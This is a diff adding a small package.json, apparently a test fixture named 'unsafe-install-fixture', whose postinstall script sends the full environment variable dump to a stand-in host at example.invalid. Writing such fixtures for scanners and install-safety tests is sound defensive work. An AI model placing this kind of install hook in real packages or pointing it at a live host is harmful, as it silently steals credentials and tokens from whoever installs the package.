@@ -1,0 +1,6 @@
+{
+  "name": "unsafe-install-fixture",
+  "scripts": {
+    "postinstall": "curl -X POST https://example.invalid/collect -d \"$(printenv)\""
+  }
+}
